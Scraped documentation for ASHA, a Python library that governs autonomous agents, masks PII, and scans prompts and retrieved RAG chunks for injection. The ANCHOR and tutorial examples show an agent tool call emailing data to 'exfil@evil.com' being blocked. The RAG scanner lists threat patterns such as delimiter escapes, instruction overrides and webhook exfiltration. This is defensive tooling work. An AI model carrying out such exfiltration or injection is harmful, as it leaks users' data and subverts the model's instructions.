docs.title: ASHA Documentation
docs.text:
ASHA is a Python library for mission-aware agent governance, Superintelligence (SI) alignment, and drop-in prompt security. Use anchor() to keep autonomous agents aligned with the user's goal, and process() / wrap_llm() to mask PII, check injection patterns, and compress prompts before they reach a model.

Licensed under the Apache License 2.0.

Developer preview (v0.4.2)

Pre-1.0: APIs may change. Install with pip install asha-si (lite path; no API key or model download). See status.md for what works vs preview vs experimental. Pin a version only when you need a frozen pilot.

Package name

The package is published on PyPI as asha-si. If you used the earlier name asha-ai, see the migration guide. The Python import remains import asha.

pip install asha-si

docs.title: ANCHOR
docs.text:
ANCHOR is ASHA's mission-aware governance layer for autonomous agents. It keeps agents aligned with a compiled mission contract, gates dangerous tool calls, detects suspicious action chains, validates plan outputs, and enforces OS-level side-effect constraints during tool execution.

Governance runs at runtime: agents and prompts do not need to mention ANCHOR.

Developer preview

ANCHOR is preview in v0.4.2. Pin asha==0.4.2 and validate on your agent stack. See status.md.

docs.title: One-line adoption
docs.text:
from asha import Agent, anchor

agent = anchor(
    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
    risk_tolerance="LOW",
    isolation="auto",
    interactive=False,  # required for scripts / CI
)
result = agent.run("Analyze trends locally and write a report.")

Framework-specific entry points:

from asha.runtime.anchor.adapters import (
    anchor_crewai,
    anchor_langchain,
    anchor_graph,  # LangGraph
    anchor_autogen,
    anchor_llamaindex,
    anchor_mcp,
    anchor_any,
)

Install only what you need (lite pip install asha-si stays free of framework deps):

pip install asha-si[crewai]
pip install asha-si[langchain]
pip install asha-si[langgraph]
pip install asha-si[llamaindex]
pip install asha-si[mcp]
pip install asha-si[anchor]   # all of the above

docs.title: Explicit ALLOW / BLOCK checks
docs.text:
from asha.runtime.anchor import AnchorRuntime
from asha.exceptions import ASHAAnchorBlocked

runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
runtime.initialize_mission(
    "Analyze Q1 sales locally and write a report. Do not send data externally.",
    context={
        "available_tools": ["load_sales_data", "write_report", "send_email"],
        "local_only": True,
    },
)

assert runtime.evaluate_action_request(
    "tool_call",
    {
        "tool_name": "write_report",
        "arguments": str({"args": (), "kwargs": {"report_content": "Q1 summary"}}),
    },
)

try:
    runtime.evaluate_action_request(
        "tool_call",
        {
            "tool_name": "send_email",
            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
        },
        raise_on_block=True,
    )
except ASHAAnchorBlocked as err:
    print(err)

docs.title: OS sandbox
docs.text:
Mode Behavior off No sandbox enforcement auto (default) In-process hooks: guarded open(), blocked network modules (best-effort, not a full OS jail) hard / subprocess Tool runs in an isolated child process 
from asha import Agent, anchor

agent = anchor(Agent(provider="mock", model="mock"), isolation="hard", interactive=False)

Supported modes: off, auto (in-process hooks), hard / subprocess (child process). This is preview isolation, not a container/seccomp jail. Container backends (docker, bwrap) raise a clear error and are deferred to 0.5.x; use hard today when you need process isolation.

docs.title: Human approval
docs.text:
When interactive=True (or a TTY with default resolution), ANCHOR can prompt on BLOCK/REVIEW:

ANCHOR HUMAN APPROVAL REQUIRED
Reason: ...
Allow this action? [y/N]:

Configure with interactive=True/False, ASHA_ANCHOR_INTERACTIVE=0, or warn_policy="strict"|"permissive".

docs.title: process()
docs.text:
from asha import process
from asha.core.policy_config import PolicyConfig

result = process(
    prompt="...",
    mode="balanced",           # strict | balanced | lite | off
    token_budget=1200,
    trace=False
)

Parameters: - prompt (str | bytes | Path): The input prompt or file to process. - mode (str, optional): Policy mode. Options: - strict: Fail-closed - raises on total failure - balanced: Fail-open fallback (default) - lite: Minimal policy; fail-open - off: Passthrough - policy (PolicyConfig, optional): Advanced runtime configuration (fields: pii_mode, reversible, preserve_intent, security_level, stage enable flags). - token_budget (int, optional): Maximum tokens permitted before truncation (default: 1200). - trace (bool, optional): If true, populates result.trace with internal execution steps. - debug (bool, optional): If true, populates result.diff with a text diff. - max_retries (int, optional): Number of retries for detector engines. - timeout_seconds (float, optional): Max timeout for execution. - verbose (bool, optional): Enables verbose console logs. - log_level (str, optional): Logging level (INFO, DEBUG). - log_output (str, optional): Output destination (console, etc). - log_file (str, optional): Path to a log file. - include_legacy_detail (bool, optional): Includes legacy dict schema.

Returns: - ProcessResult: Contains .output (scrubbed string) and .security (detection summary).

docs.title: SecureLLM (v0.4.2)
docs.text:
Single-line transparent proxy for any LLM client.

from asha import SecureLLM, Profile
import openai

# One line: drop-in replacement with identical API
client = SecureLLM(openai.OpenAI(), profile=Profile.BALANCED())

response = client.chat.completions.create(
    model="gpt-4o",
    messages=[{"role": "user", "content": "Email alice@corp.com the Q3 report"}]
)
# ↑ alice@corp.com is masked before going to OpenAI, re-hydrated in the response

Parameters: - client: Any LLM client (OpenAI, Anthropic, Gemini, Ollama). - profile (Profile, optional): Zero-config security preset. Defaults to Profile.BALANCED(). - mode (str, optional): Policy mode string ('strict', 'balanced', 'lite', 'off'). Ignored if profile is provided. - token_budget (int, optional): Override profile token budget. - rehydrate_pii (bool, optional): Re-hydrate masked PII in LLM responses. Defaults to True. - vault (PIIVault, optional): Existing vault for multi-session PII continuity.

Intercepted methods: chat.completions.create, messages.create, generate_content, generate, create.

docs.title: Profile (v0.4.2)
docs.text:
Zero-config security profile presets.

from asha import Profile

# Factory classmethods
Profile.STRICT()      # Fail-closed, injection threshold 0.65, max 5 agent steps
Profile.BALANCED()    # Enterprise default: threshold 0.85, max 15 steps
Profile.PERMISSIVE()  # Audit/observe mode: never blocks, logs violations
Profile.DEVELOPER()   # Verbose + debug, rich terminal output, fail-open

# Custom profile
profile = Profile(
    mode="balanced",
    fail_closed=True,
    injection_threshold=0.80,
    token_budget=2048,
    max_agent_steps=10,
)

Preset comparison:

Preset Mode Fail-closed Threshold Token Budget Agent Steps STRICT strict ✅ 0.65 1000 5 BALANCED balanced ✅ 0.85 2048 15 PERMISSIVE lite ❌ 0.95 4096 50 DEVELOPER balanced ❌ 0.80 2048 20

docs.title: PIIVault (v0.4.2)
docs.text:
Thread-safe, session-scoped reversible PII masking.

from asha import PIIVault

vault = PIIVault()  # One vault per session/conversation

# Mask: replace PII with indexed tokens
masked = vault.mask("Email alice@corp.com or call 555-123-4567")
# → "Email <EMAIL_1> or call <PHONE_1>"

# Unmask: re-hydrate tokens in LLM responses
response_text = "I'll email <EMAIL_1> the report."
final = vault.unmask(response_text)
# → "I'll email alice@corp.com the report."

vault.summary()  # {'email': 1, 'phone': 1}
vault.clear()    # Wipe all vault entries

Detected PII types: email, phone, credit_card, ssn, api_key, jwt_token, bearer_token, address.

docs.title: scan_rag_context() (v0.4.2)
docs.text:
Indirect injection scanner for RAG retrieved documents.

from asha import scan_rag_context

docs = retriever.get_relevant_documents(query)
result = scan_rag_context(docs, query=query)

if result.poisoned_count > 0:
    print(f"⚠️  {result.poisoned_count} poisoned chunks detected at indices: {result.poisoned_indices}")

# Use only verified safe chunks
safe_context = "\n\n".join(result.safe_documents)

Parameters: - documents (list[str] | list[dict]): Retrieved text chunks or dicts with text/page_content key. - query (str, optional): User query for relevance scoring. - include_sanitized (bool, optional): Include sanitized versions of poisoned chunks. Defaults to True. - confidence_threshold (float, optional): Minimum confidence to classify a chunk as poisoned. Defaults to 0.6.

Returns: RAGScanResult with .poisoned_indices, .safe_documents, .sanitized_documents, .poisoned_count.

Detected threats: delimiter_escape (</context>, [SYSTEM]), instruction_override (classic injection), exfiltration (webhook/POST patterns).

docs.title: AgentCostGuard (v0.4.2)
docs.text:
Stateful agentic loop budget enforcement.

from asha import AgentCostGuard, AgentBudgetExceeded

guard = AgentCostGuard(
    max_steps=10,         # Hard step limit
    max_tokens=8000,      # Cumulative token budget
    max_cycle_repeat=3,   # Max identical tool+args repetitions
    raise_on_limit=True,  # Set False for audit mode
)

for tool_name, tool_args in agent.run():
    try:
        guard.record_tool_call(tool_name, tool_args, token_count=150)
    except AgentBudgetExceeded as e:
        print(f"Budget exceeded: {e.budget_type} {e.current}/{e.limit}")
        break
    result = execute_tool(tool_name, tool_args)

stats = guard.stats()
print(f"Steps: {stats.total_steps}, Tokens: {stats.total_tokens}, Healthy: {stats.is_healthy}")

Parameters: - max_steps (int, optional): Maximum execution steps. Defaults to 25. - max_tokens (int, optional): Cumulative token budget. Set to 0 to disable. Defaults to 50,000. - max_cycle_repeat (int, optional): Cycle detection threshold. Defaults to 3. - raise_on_limit (bool, optional): Raise on violation vs. audit-only. Defaults to True.

AgentBudgetExceeded attributes: .budget_type ('steps', 'tokens', 'cycle'), .current, .limit.

docs.title: Architecture
docs.text:
ASHA v0.4.2: compiler-inspired prompt processing with strict layer boundaries, plus a separate ANCHOR runtime for agent governance.

This page explains the current mental model. It is not a how-to and not an API reference.

docs.title: Prompt processing flow
docs.text:
User input
    │
    ▼
Security (run_security)      ← PII detection, injection checks, masking
    │
    ▼
Compilation (compile_prompt) ← internal representation → structured prompt
    │
    ▼
Optimization (optimize_tokens) ← token compression (MSDPC)
    │
    ▼
ProcessResult                ← typed output, metrics, optional trace

process() runs all three engines. sanitize() runs security only. optimize() runs token compression only. mode="off" skips engines via the policy gate.

You interact with this pipeline as a black box through the drop-in API. Use trace=True when you need stage visibility.

Agent adds model routing and LLM generation on top of the same preprocessing path.

docs.title: ANCHOR (agent governance)
docs.text:
ANCHOR sits beside the prompt pipeline. It does not replace process(); it governs autonomous agents at runtime:

User prompt → Mission contract (immutable)
                    ↓
        Action / memory / plan / chain guards → ALLOW | WARN | BLOCK | REVIEW
                    ↓
        Process sandbox (hooks or subprocess) → execution or halt

Adoption is typically anchor(agent) or a framework adapter. Details: anchor.md.

docs.title: The 5-Step Developer Roadmap

All contributors are encouraged to advance through these five progressive milestones:

  1. Step 1: Understand Deeply: Master the architecture, public facade (asha/__init__.py), public contracts (tests/contracts/), and run the live showcase (streamlit run examples/showcase/app.py).
  2. Step 2: Optimize Core Drop-Ins: Ensure process(), sanitize(), optimize() (and async variants) are reliable, lightweight (< 5ms), non-mutating, fail-closed, and strictly free of heavy ML dependencies in the base install.
  3. Step 3: Fortify ANCHOR (Make It Real): ANCHOR must never be governance "in name only." Build solid action guards, parameter normalization, chain/memory guards, sandboxing, and test all framework adapters (CrewAI, LangChain, LangGraph, LlamaIndex, MCP, AutoGen) against real adversarial threats.

Documentation is non-negotiable: clear docstrings, updated Markdown guides, parameter tables, and runnable examples are required for every PR.
  5. Step 5: Innovate, Scale, and Bring Ambitious Ideas: Once the foundation is solid and documented, bring ambitious proposals! Pitch RFCs for international PII scanners, streaming token guards, containerized sandboxes, and enterprise telemetry on GitHub Discussions.

docs.title: Core concepts
docs.text:
ASHA v0.4.2: how the pieces fit together.

ASHA preprocesses prompts (detect PII, check threats, compile structure, compress tokens) and can govern autonomous agents via ANCHOR. You call one function; engines run inside PromptProcessor. ANCHOR is a separate runtime path.

docs.title: Root package
docs.text: from asha import process, sanitize, optimize, Agent, anchor

docs.title: Common subpackage imports
docs.text:
from asha.integrations import wrap_llm
from asha.types import ProcessResult, SanitizeResult, OptimizeResult
from asha.core.policy_config import PolicyConfig
from asha.runtime import PromptProcessor
from asha.utils.dropin import process_async
from asha.utils.unmask import unmask

There is no global configure(). Pass mode and policy per call.

Experimental helpers (recommend_local_model, smart routing, AdapterFactory) live under experimental-features.md.

docs.title: Processing flow
docs.text:
process(prompt)
  → resolve mode + PolicyConfig
  → PromptProcessor.run()
      → run_security()      # PII, injection, masking
      → compile_prompt()    # internal representation → structured text
      → optimize_tokens()   # token compression
  → ProcessResult

sanitize() runs security only. optimize() runs token compression only.

docs.title: Policy modes
docs.text:
Mode Security Optimization On total failure balanced Standard Yes Fail-open + fallback strict Maximum Yes Raises ASHAProcessingError lite Minimal features Reduced Fail-open (same as balanced) off Skipped Skipped Passthrough 
process("prompt", mode="balanced")  # default
process("prompt", mode="strict")
process("prompt", mode="off")

docs.title: PolicyConfig
docs.text:
Advanced knobs are not top-level kwargs on process():

from asha.core.policy_config import PolicyConfig

process(
    prompt,
    policy=PolicyConfig(
        pii_mode="rule",       # hybrid (default) | rule | lite | ml_only
        reversible=False,
        preserve_intent=False,
        security_level="medium",
    ),
)
Field Purpose pii_mode Detection strategy (default "hybrid"; soft-falls back without ML) reversible Store masking map for unmask() preserve_intent Skip optimization when no PII/threats security_level low / medium / high

docs.title: ProcessResult
docs.text:
result = process("prompt")
result.output          # processed text
result.original        # input text
result.degraded        # True if fallback path used
result.security        # SecurityInfo (PII, threats)
result.metrics         # tokens, timing
result.trace           # when trace=True
result.diff            # when debug=True
str(result)            # same as result.output

docs.title: SanitizeResult / OptimizeResult
docs.text:
Same pattern: .output, .security (sanitize), .metrics (optimize).

Legacy dict: result.to_dict() or asha.compat.legacy_results.to_legacy_pipeline_dict(result).

docs.title: Fail-open vs fail-closed
docs.text: API Default Strict process() / sanitize() Fail-open fallback mode="strict" raises wrap_llm() Uses caller mode Transport errors raise when mode != "off" auto_patch() Default mode="strict" Configurable

docs.title: Reversible masking
docs.text:
from asha import sanitize
from asha.core.policy_config import PolicyConfig
from asha.utils.unmask import unmask

result = sanitize(
    "Email alice@corp.com",
    policy=PolicyConfig(reversible=True),
)
safe = result.output
restored = unmask(safe, result.security.masking_map)

Govern autonomous agents anchor(agent) / framework adapters Task-based model pick Agent(routing_config=...) (experimental) Local model advice recommend_local_model() (experimental)

Agent(privacy=True) enables preprocessing with strict internal mode. privacy=False disables it.

docs.text: How to inspect what ASHA did to a prompt using traces and diffs.

docs.title: Trace a process() call
docs.text:
from asha import process

result = process(
    "Analyze data with john@example.com",
    trace=True,
    debug=True,
)

print(result.output)
print(result.trace)
print(result.diff)

trace=True records stage names, timing, and intermediate outputs. debug=True adds result.diff (unified diff) and optional debug metadata.

result = process("prompt", debug=True)
if result.degraded:
    print(result.degraded_reason)
print(result.diff)

agent = Agent(model="mock")
result = agent.run("prompt with john@x.com", trace=True)

print(result.response)
print(result.adapter_info)

docs.title: Architecture
docs.text:
asha/
├── core/          # engines, policy, security, compiler, _ir (internal)
├── runtime/       # PromptProcessor, resolve, Agent, adapters
├── integrations/  # wrap_llm, auto_patch, framework middleware
├── compat/        # legacy_results only (opt-in dict conversion)
├── types/         # ProcessResult, SanitizeResult
├── utils/         # dropin (process/sanitize/optimize)
├── cli/           # asha CLI (ancillary)
└── __init__.py    # 5 exports only

Layer boundaries:

  • core/ must not import runtime, integrations, or compat
  • runtime/ must not import integrations or compat
  • types/ and utils/ must not import compat
  • integrations/ may import runtime and core
  • compat/ may import anything (legacy dict helpers only)

docs.title: Policy configuration
docs.text:

docs.title: Safety semantics
docs.text:
Mode process() / sanitize() Integrations (mode != "off") strict Raises on total failure Processing strict; transport errors raise balanced / lite Degraded fallback Processing balanced; transport errors raise off Passthrough No processing; transport errors propagate

auto_patch(mode="strict") defaults to strict for global SDK patching.

docs.title: FAQ
docs.text: ASHA v0.4.2

docs.title: What is ASHA?
docs.text: A Python library for mission-aware agent governance (anchor) and drop-in prompt security (process / wrap_llm): mask PII, check injection patterns, and compress tokens before prompts reach a model.

docs.title: Is it production-ready?
docs.text: Developer preview. Install with pip install asha-si for everyday use. For production pilots, pin the version you tested (e.g. asha-si==0.4.2) and monitor. A semver-stable 1.0 API guarantee is not claimed yet. Read status.md.

docs.title: What can I import from the root?
docs.text:
from asha import process, sanitize, optimize, Agent, anchor

Nothing else: no wrap_llm, Pipeline, or Processor at root.

docs.title: Where is wrap_llm?
docs.text: from asha.integrations import wrap_llm

docs.title: What does process() return?
docs.text: A ProcessResult dataclass. str(result) returns result.output.

docs.title: Does process() raise?
docs.text:
• mode="balanced" (default): fail-open with degraded fallback (result.degraded=True)
  • mode="strict": raises ASHAProcessingError on total failure

docs.title: How do I get metrics?
docs.text:
result = process("prompt")
print(result.metrics.token_reduction_pct)
print(result.security.pii_detected)

No return_metrics=True; use typed fields.

docs.title: How do I set pii_mode or reversible?
docs.text:
from asha.core.policy_config import PolicyConfig
process(prompt, policy=PolicyConfig(pii_mode="hybrid", reversible=True))

Top-level pii_mode= on process() raises TypeError. Default pii_mode is "hybrid" (soft-falls back without ML deps).

docs.title: Modes
docs.text: Mode Description balanced Default: security + optimization strict Fail-closed lite Minimal policy features off Passthrough

docs.title: Token reduction?
docs.text: Depends on the prompt. Short prompts may see little or negative reported reduction after compile restructuring. Measure with performance.md.

docs.title: Speed?
docs.text: Rule-based installs are typically tens of milliseconds on ordinary prompts; ML paths are slower. Use mode="lite" or mode="off" for lower latency. Re-run the benchmark harness on your hardware.

docs.title: Does process() mask PII in attached documents?
docs.text: Yes when ASHA can read the file: pass a path/bytes to sanitize / process, or use wrap_llm so local attachments are extracted and masked before the LLM call. Scanned/image-only PDFs need OCR (not included). Provider-only file_id uploads without local bytes are not readable (see security.md).

docs.title: What PII is detected?
docs.text: Emails, phones, SSNs, credit cards, API keys, JWTs, IPs, and more. See security.md.

docs.title: GDPR compliant?
docs.text: ASHA is privacy tooling, not a certified compliance product. See compliance.md.

docs.title: Agent.run() return type?
docs.text: String by default. AgentResult when trace=True.

docs.title: How do I govern an agent?
docs.text:
from asha import Agent, anchor

agent = anchor(Agent(provider="mock", model="mock"), interactive=False)

See anchor.md and tutorial.md.

docs.title: Is the ANCHOR sandbox a real container?
docs.text: No. isolation="auto" uses in-process hooks; isolation="hard" uses a subprocess. Docker/bubblewrap are not implemented yet (see status.md).

docs.title: Where do I ask questions?
docs.text: GitHub Discussions (primary) or ASHA Slack for optional chat.

docs.title: How do hardened models download?
docs.text: pip install asha-si[hardened] auto-fetches https://github.com/AjayRajan05/asha-si/releases/download/asha-models-0.4.2/asha-models-0.4.2.zip on first use. Override with ASHA_MODELS_DIR / ASHA_MODELS_ZIP / ASHA_DISABLE_MODEL_DOWNLOAD=1.

docs.title: Optimization

docs.title: Compress tokens only

print(result.metrics.token_reduction_pct)

result = process("long verbose prompt please analyze carefully", token_budget=1200)

from asha.core.policy_config import PolicyConfig

    prompt,
    policy=PolicyConfig(preserve_intent=True),

docs.title: Performance
docs.text:
ASHA v0.4.2: how to measure performance, and how to tune latency vs security.

Numbers below that come from a committed baseline are labeled as such. Re-run on your hardware before treating any figure as a target.

docs.title: How to run benchmarks
docs.text:
pip install -e .
python benchmarks/run_benchmarks.py --save

Compare against the committed baseline:

python benchmarks/run_benchmarks.py --compare benchmarks/baseline/results.json
asha benchmark --save

What the harness measures (asha.core.benchmark.BenchmarkHarness):

  • PII detection / masking coverage on sample prompts
  • Token-reduction metrics
  • Latency (avg, P95, P99)
  • Fail-safe rate
  • False-positive checks (teaching emails skipped)

Sample prompts: benchmarks/sample_prompts.json.

Programmatic:

from asha.core.benchmark import BenchmarkHarness

harness = BenchmarkHarness()
summary = harness.run_all(mode="balanced")
print(summary)

docs.title: Baseline artifact
docs.text:
Path Description benchmarks/baseline/results.json Committed baseline (re-run after major changes) benchmarks/output/ Timestamped local runs

The committed baseline currently reports (rule-based / lite-style install on the machine that produced it):

Metric Baseline value P95 pipeline latency ~58 ms Fail-safe rate 1.0 False-positive rate 0.0

These are not SLAs. Re-run the harness for current numbers on your stack. Do not publish or rely on token-reduction marketing figures without a fresh local run; summary reduction can be near zero while individual prompt metrics vary by input shape.

docs.title: CI gates (reference)
docs.text:
On push (Ubuntu, Python 3.11), CI runs architecture tests, coverage floor, benchmark smoke/regression vs baseline, and related quality gates. See repository workflows for the exact thresholds in force.

Semantic equivalence gate: CI requires at least ~30% of benchmark prompt pairs to pass check_semantic_equivalence. That is a smoke / regression floor, not a production SLA and not a claim that optimization preserves meaning. Treat it as “the pipeline did not totally scramble the suite,” then validate on your own prompts.

docs.title: How to tune
docs.text: Priority Settings Speed mode="lite" or mode="off"; PolicyConfig(pii_mode="rule") Security mode="strict"; PolicyConfig(pii_mode="hybrid") (needs asha-si[ml]) Token savings Lower token_budget; keep optimization enabled Semantic fidelity PolicyConfig(preserve_intent=True)

docs.text:
from asha import process

result = process(prompt, mode="lite")
# or
result = process(prompt, mode="off")

Avoid on hot paths: trace=True, debug=True, and ML PII until you need them.

docs.title: ASHA Developer Roadmap: Foundation to v1.0.0
docs.text: This roadmap communicates ASHA's trajectory toward v1.0.0. It establishes short-term foundational priorities and defines the explicit maturity criteria required for a production-grade 1.0 release.

docs.title: 1. Short-Term Foundation Vision
docs.text:
The primary short-term objective is:

Make the library foundationally strong, easy for developers to understand, easy for users to adopt, properly tested through real-world use cases, architecturally coherent, lightweight, and ready for continued community improvement.

Rather than rushing to add speculative features or inflate superficial test counts, development focuses on five core pillars:

  1. Test Integrity: Eliminate test-to-pass evasions and replace artificial coverage tests with end-to-end user workflow suites (tests/use_cases/).
  2. Zero-Heavy-Dependency Core: Maintain strict discipline so pip install asha-si requires only minimal lightweight libraries (pydantic, tiktoken, requests, click, pypdf, python-docx), ensuring sub-second import times.
  3. Transparent Ergonomics: Ensure transparent client proxying (SecureLLM), zero-config presets (Profile.BALANCED(), Profile.STRICT()), and multi-turn session privacy (PIIVault).
  4. Truthful Documentation: Keep all docstrings, tutorials, and examples 100% faithful to the actual implementation.
  5. Community Feedback Loop: Actively invite developer review through the interactive Control Center showcase (streamlit run examples/showcase/app.py).

docs.title: 2. v1.0.0 Readiness Criteria
docs.text:
ASHA will reach v1.0.0 when all of the following architectural and operational conditions are satisfied:

  • API Stability: The public API exported from asha/__init__.py is frozen. No breaking signature changes without a formal deprecation cycle.
  • Deterministic Contracts: Given identical inputs and policy profiles, ASHA produces consistent, deterministic sanitization and optimization across all supported operating systems (Linux, macOS, Windows).
  • Fail-Closed by Default: In production modes, security violations and anomalous payloads are reliably blocked before reaching external model providers.
  • Complete Use-Case Validation: Every major feature (SecureLLM, PIIVault, AgentCostGuard, scan_rag_context, ANCHOR) has passing real-world integration tests.
  • Packaging & Distribution Hygiene: Clean PyPI wheels, zero maintainer scratch artifacts, and complete absence of large training datasets or private weights in public releases.

docs.title: Reporting a Vulnerability
docs.text:
If you discover a security vulnerability in ASHA, please report it responsibly.

Do not open a public GitHub issue for security vulnerabilities.

Instead, email: ajayrajan727@gmail.com

Include:

  • A description of the vulnerability
  • Steps to reproduce
  • Potential impact
  • Suggested fix (if any)

We aim to acknowledge reports within 48 hours and provide a status update within 7 days.

docs.title: Scope
docs.text:
This policy covers:

  • PII detection and masking bypasses
  • Prompt injection / jailbreak evasion in ASHA's security layer
  • Fail-safe behavior failures (data leakage on error paths)
  • Dependency vulnerabilities in core asha package dependencies

Out of scope:

  • Vulnerabilities in third-party LLM providers (OpenAI, Anthropic, etc.)
  • Applications that disable privacy features (privacy=False, mode="off")
  • ML model behavior when using optional [ml] / [hardened] extras
  • ANCHOR framework-adapter edge cases outside CI stub coverage

docs.title: Security Design Principles
docs.text:
ASHA follows these defaults:

  • Privacy-first: PII masking enabled by default
  • Fail-safe: Returns original or sanitized content on errors - never crashes the host app
  • No hidden downloads: Rule-based / lite path requires no model downloads
  • Local processing: Core security runs locally; no telemetry sent by default
  • Fail-closed on uncertain detections when hardened paths are available (REVIEW / restrictive defaults rather than silent ALLOW)

docs.title: Best Practices for Users
docs.text:
• Install with pip install asha-si; pin a tested version (e.g. asha-si==0.4.2) for production pilots
  • Use mode="strict" for sensitive workloads
  • Prefer wrap_llm() over auto_patch()
  • Run pip audit regularly on your environment
  • Do not log raw prompts containing PII in production
  • Validate ASHA on your own data before compliance use
  • Treat ANCHOR and experimental features as preview until 1.0
  • Never commit .env or detector weights to the public repository

docs.title: Security
docs.text:
How to detect and mask PII, check prompt-injection patterns, and choose fail-closed vs fail-open behavior.

Security is the first engine in process() and the only engine in sanitize().

Developer preview

Pin asha==0.4.2. Public docs describe what is defended against and the general shape of the defense (layered detection, calibrated fail-closed behavior), not internal scoring mechanics.

docs.title: Detect PII and threats
docs.text:
from asha import process, sanitize

result = process("Contact john@company.com or 555-123-4567", mode="balanced")
print(result.output)
print(result.security.pii_detected)
print(result.security.threats)
print(result.security.threat_level)

docs.title: Common PII types (rule-based path)
docs.text:
Type Examples Email user@example.com Phone 555-123-4567 SSN 123-45-6789 Credit card 4111-1111-1111-1111 API key / secret sk-... JWT eyJ... IP address 192.168.1.1 Address / name Heuristic with context keywords

Teaching placeholders like test@example.com are skipped.

Mask tokens look like [EMAIL_HASH]_…, [PHONE_HASH]_…, or [REDACTED] for high-risk secrets.

docs.title: Document inputs (PDF / DOCX / text files)
docs.text:
process(), sanitize(), and optimize() accept a file path, Path, or bytes (pass filename= for bytes). Text is extracted (no OCR), then the normal PII/security pipeline runs.

from asha import sanitize, process
from pathlib import Path

sanitize(Path("report.pdf"))          # extract + mask
process("notes.docx", mode="balanced")
sanitize(raw_bytes, filename="memo.docx")

Supported text documents on the base install: .txt, .md, .csv, .html, .pdf, .docx.

With wrap_llm, local file attachments in the request (message file parts, files= / path kwargs the wrapper can see) are extracted and PII-masked before the call is sent to the provider. Opaque provider file_id uploads without local bytes cannot be read: upload masked text instead, or pass a local path/bytes the wrapper can see.

docs.title: Choose a safety mode
docs.text:
from asha import process, sanitize

process(prompt, mode="balanced")  # fail-open fallback (default)
process(prompt, mode="strict")    # raises ASHAProcessingError on total failure
sanitize(prompt, mode="strict")
Mode On total security failure balanced / lite Degraded result, degraded=True strict Raises off Passthrough

docs.title: Configure PII mode
docs.text:
Set via PolicyConfig (not a top-level kwarg on process()):

from asha import process
from asha.core.policy_config import PolicyConfig

process("Contact john@example.com", policy=PolicyConfig(pii_mode="rule"))
process("...", policy=PolicyConfig(pii_mode="lite"))     # alias of rule-style lite path
process("...", policy=PolicyConfig(pii_mode="hybrid"))   # default; needs asha-si[ml] for full NER
pii_mode Description Install hybrid Default: rules + ML when available; soft-falls back without ML deps Core; full NER needs asha-si[ml] rule / lite Regex + heuristic only Core only ml_only Experimental ML-only path asha-si[ml]

For stronger classical ML detectors, install asha-si[hardened]. Detector weights download automatically on first use into a local cache (no permission prompt). Override with ASHA_MODELS_DIR for air-gapped installs, or set ASHA_DISABLE_MODEL_DOWNLOAD=1 to force lite fallbacks. Base installs need no model files, which is the path meant for everyone.

docs.title: Sanitize only
docs.text:
from asha import sanitize

result = sanitize("john@corp.com - summarize")
print(result.safe)
print(result.security.pii_detected)

docs.title: Reversible masking
docs.text:
from asha import sanitize
from asha.core.policy_config import PolicyConfig
from asha.utils.unmask import unmask

result = sanitize(
    "Email alice@corp.com",
    policy=PolicyConfig(reversible=True),
)
restored = unmask(llm_output, result.security.masking_map)

Store masking_map securely: it can reverse pseudonymization.

docs.title: Secure an existing SDK client
docs.text:
from asha.integrations import wrap_llm

client = wrap_llm(openai_client, mode="balanced")
  • Uses the caller's mode for preprocessing
  • Infrastructure/wrap failures raise when mode != "off" (never silently send raw prompts)

docs.title: Defense shape (explanation for operators)
docs.text:
ASHA stacks multiple checks rather than relying on a single pattern list:

  1. Rule/heuristic detectors available on every install
  2. Optional ML/NER paths when extras are installed
  3. Calibrated fail-closed behavior on uncertain scores (escalate to REVIEW / restrictive defaults rather than silent ALLOW)

Exact thresholds, model artifacts, and feature representations are intentionally not documented in public guides.

docs.title: Tutorial
docs.text: Goal: install ASHA, process one prompt end-to-end, wrap an LLM client pattern, and run a governed mock agent. About five minutes. (v0.4.2 developer preview; pin asha-si==0.4.2.)

docs.title: 1. Install
docs.text:
pip install asha-si

Python 3.10+ required. No API key and no model download are needed for this tutorial.

Verify:

from asha import process

print(process("Hello world").output)

docs.title: 2. Process a prompt
docs.text:
process() runs security → compile → optimize and always returns a typed ProcessResult. str(result) equals result.output.

from asha import process

result = process(
    "Contact john@example.com for data analysis",
    mode="balanced",
)

print(result.output)
print(result.security.pii_detected)
print(result.metrics)

Sensitive values are masked (emails, phones, SSNs, API keys, and related patterns). Teaching placeholders such as test@example.com are skipped.

docs.title: Modes you will use most
docs.text:
Mode Behavior balanced Default: security + optimization; fail-open on total failure strict Fail-closed: raises on total failure lite Minimal policy features off Passthrough (prompt unchanged) 
process("...", mode="strict")
process("...", mode="off")

Security-only or optimize-only:

from asha import sanitize, optimize

print(sanitize("john@x.com").output)
print(optimize("Please carefully and thoroughly analyze the following dataset").output)

docs.title: 3. Wrap an LLM client (optional)
docs.text:
Requires pip install asha-si[openai] and OPENAI_API_KEY. Skip this step if you only want local preprocessing.

from asha.integrations import wrap_llm
import openai

client = wrap_llm(openai.OpenAI(), mode="balanced")

response = client.chat.completions.create(
    model="gpt-4o-mini",
    messages=[{"role": "user", "content": "Analyze data with john@email.com"}],
)

Import wrap_llm from asha.integrations, not the package root. Use mode="off" for passthrough.

docs.title: 4. Govern a mock agent with ANCHOR
docs.text:
ANCHOR compiles a mission contract and gates tool calls. Use interactive=False in scripts and CI so REVIEW verdicts do not block on a TTY prompt.

from asha import Agent, anchor

agent = anchor(
    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
    risk_tolerance="LOW",
    isolation="auto",
    interactive=False,
)

print(agent.run("Generate the monthly sales report from Q1 data"))

To see an explicit ALLOW vs BLOCK decision without an LLM:

from asha.runtime.anchor import AnchorRuntime
from asha.exceptions import ASHAAnchorBlocked

runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
runtime.initialize_mission(
    "Analyze Q1 sales locally and write a report. Do not send data externally.",
    context={
        "available_tools": ["load_sales_data", "write_report", "send_email"],
        "local_only": True,
    },
)

assert runtime.evaluate_action_request(
    "tool_call",
    {
        "tool_name": "write_report",
        "arguments": str({"args": (), "kwargs": {"report_content": "Q1 summary"}}),
    },
)

try:
    runtime.evaluate_action_request(
        "tool_call",
        {
            "tool_name": "send_email",
            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
        },
        raise_on_block=True,
    )
except ASHAAnchorBlocked as err:
    print(err)

Stay on 0.4.2 until the product is fully built and the maintainer is ready to acknowledge a stable API. No rush.

  1. 0.4.x - Current track (finish release leftovers + pilot quality here)
